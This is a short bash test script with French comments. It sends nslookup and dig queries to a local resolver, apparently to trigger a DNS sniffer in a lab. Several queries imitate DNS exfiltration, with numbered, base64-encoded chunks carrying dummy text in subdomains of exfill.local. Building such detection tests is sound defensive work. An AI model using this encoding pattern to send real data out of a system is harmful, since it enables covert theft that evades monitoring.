#!/bin/bash

echo "=== Test de requêtes DNS directes pour déclencher le sniffer ==="

echo "Test 1: Requête DNS directe au resolver"
nslookup google.com resolver

echo ""
echo "Test 2: Requêtes DNS avec sous-domaines suspects"
nslookup 0-dGVzdCBkYXRh.a1b2c.exfill.local resolver
nslookup 1-bGljZW5jZSBleA.x9z8y.exfill.local resolver
nslookup 2-ZmlsdHJhdGlvbg.m3n4o.exfill.local resolver

echo ""
echo "Test 3: Requêtes avec dig pour plus de précision"
dig @resolver 0-dGVzdCBkYXRh.a1b2c.exfill.local A
dig @resolver 1-bGljZW5jZSBleA.x9z8y.exfill.local A

echo "=== Fin des tests DNS ==="
